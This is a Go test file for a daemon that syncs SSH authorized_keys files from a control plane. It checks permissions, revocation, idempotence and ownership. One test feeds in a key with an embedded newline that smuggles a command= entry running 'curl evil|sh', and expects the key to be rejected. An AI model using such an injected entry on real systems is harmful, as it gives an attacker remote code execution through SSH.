package daemon

import (
	"os"
	"path/filepath"
	"testing"
)

func TestSyncAuthorizedKeysLeavesFileAloneWhenControlPlaneSaysNothing(t *testing.T) {
	path := filepath.Join(t.TempDir(), ".ssh", "authorized_keys")
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte("ssh-ed25519 AAAA existing\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	changed, err := syncAuthorizedKeys(path, nil)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if changed {
		t.Fatal("a nil key set must not rewrite the file")
	}

	body, _ := os.ReadFile(path)
	if string(body) != "ssh-ed25519 AAAA existing\n" {
		t.Fatalf("file was modified: %q", body)
	}
}

func TestSyncAuthorizedKeysWritesNewKeys(t *testing.T) {
	path := filepath.Join(t.TempDir(), ".ssh", "authorized_keys")

	changed, err := syncAuthorizedKeys(path, []string{"ssh-ed25519 BBBB laptop"})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !changed {
		t.Fatal("expected the file to be created")
	}

	body, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if string(body) != "ssh-ed25519 BBBB laptop\n" {
		t.Fatalf("unexpected body: %q", body)
	}

	info, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	if info.Mode().Perm() != 0o600 {
		t.Fatalf("authorized_keys must be 0600, got %v", info.Mode().Perm())
	}
}

func TestSyncAuthorizedKeysRevokesRemovedKeys(t *testing.T) {
	path := filepath.Join(t.TempDir(), ".ssh", "authorized_keys")

	if _, err := syncAuthorizedKeys(path, []string{"ssh-ed25519 AAAA one", "ssh-ed25519 BBBB two"}); err != nil {
		t.Fatal(err)
	}

	// The dashboard removed one key. It must stop working here too.
	changed, err := syncAuthorizedKeys(path, []string{"ssh-ed25519 AAAA one"})
	if err != nil {
		t.Fatal(err)
	}
	if !changed {
		t.Fatal("expected a revocation to rewrite the file")
	}

	body, _ := os.ReadFile(path)
	if string(body) != "ssh-ed25519 AAAA one\n" {
		t.Fatalf("revoked key survived: %q", body)
	}
}

func TestSyncAuthorizedKeysEmptySetTruncates(t *testing.T) {
	path := filepath.Join(t.TempDir(), ".ssh", "authorized_keys")

	if _, err := syncAuthorizedKeys(path, []string{"ssh-ed25519 AAAA one"}); err != nil {
		t.Fatal(err)
	}

	if _, err := syncAuthorizedKeys(path, []string{}); err != nil {
		t.Fatal(err)
	}

	body, _ := os.ReadFile(path)
	if string(body) != "" {
		t.Fatalf("expected an empty file, got %q", body)
	}
}

func TestSyncAuthorizedKeysIsIdempotent(t *testing.T) {
	path := filepath.Join(t.TempDir(), ".ssh", "authorized_keys")
	keys := []string{"ssh-ed25519 BBBB two", "ssh-ed25519 AAAA one"}

	if _, err := syncAuthorizedKeys(path, keys); err != nil {
		t.Fatal(err)
	}

	// Same set, different order — must not be seen as a change.
	changed, err := syncAuthorizedKeys(path, []string{"ssh-ed25519 AAAA one", "ssh-ed25519 BBBB two"})
	if err != nil {
		t.Fatal(err)
	}
	if changed {
		t.Fatal("reordering the same keys must not count as a change")
	}
}

func TestSyncAuthorizedKeysRejectsEmbeddedNewlines(t *testing.T) {
	path := filepath.Join(t.TempDir(), ".ssh", "authorized_keys")

	// A key carrying a newline could smuggle a second, attacker-chosen entry
	// (or a command= option) into the file.
	if _, err := syncAuthorizedKeys(path, []string{"ssh-ed25519 AAAA one\ncommand=\"curl evil|sh\" ssh-rsa CCCC"}); err != nil {
		t.Fatal(err)
	}

	body, _ := os.ReadFile(path)
	if string(body) != "" {
		t.Fatalf("a key containing a newline must be dropped, got %q", body)
	}
}

func TestSyncAuthorizedKeysKeepsDirectoryOwnership(t *testing.T) {
	// The daemon runs as root. sshd refuses an authorized_keys file the
	// logging-in user does not own, so a root-owned rewrite would lock out
	// every key — including ones that already worked.
	dir := t.TempDir()
	sshDir := filepath.Join(dir, ".ssh")
	if err := os.MkdirAll(sshDir, 0o700); err != nil {
		t.Fatal(err)
	}

	wantUID, wantGID, ok := ownerOf(sshDir)
	if !ok {
		t.Skip("platform does not expose file ownership")
	}

	path := filepath.Join(sshDir, "authorized_keys")
	if _, err := syncAuthorizedKeys(path, []string{"ssh-ed25519 AAAA one"}); err != nil {
		t.Fatal(err)
	}

	gotUID, gotGID, ok := ownerOf(path)
	if !ok {
		t.Fatal("could not read back ownership")
	}
	if gotUID != wantUID || gotGID != wantGID {
		t.Fatalf("authorized_keys owned by %d:%d, want %d:%d", gotUID, gotGID, wantUID, wantGID)
	}
}
